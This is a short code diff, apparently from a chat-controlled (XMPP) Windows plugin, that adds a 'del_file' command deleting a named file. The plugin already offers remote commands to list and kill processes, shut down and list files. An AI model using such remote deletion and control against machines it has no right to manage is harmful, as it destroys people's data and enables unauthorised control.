@@ -91,12 +91,21 @@ int EXPORT ListFile (const Cmd *cmd, xmpp_ctx_t *ctx,
 	return 1;
 }
 
+int EXPORT DelFile (const Cmd *cmd, xmpp_ctx_t *ctx,
+						xmpp_conn_t *const conn, xmpp_stanza_t *const stanza) {
+    const ArgList *arg = cmd->args;
+    if (arg == 0) return 0;
+    Win32::DelFile(ARG_STR(arg));
+    return 1;
+}
+
 int EXPORT plugin_init (CmdState *cs) {
     cs_register(cs, PLUGIN_NAME, "msgbox", MsgBox);
     cs_register(cs, PLUGIN_NAME, "list_process", ListProcess);
     cs_register(cs, PLUGIN_NAME, "kill_process", KillProcess);
     cs_register(cs, PLUGIN_NAME, "shutdown", Shutdown);
     cs_register(cs, PLUGIN_NAME, "list_file", ListFile);
+    cs_register(cs, PLUGIN_NAME, "del_file", DelFile);
 
     return 1;
 }
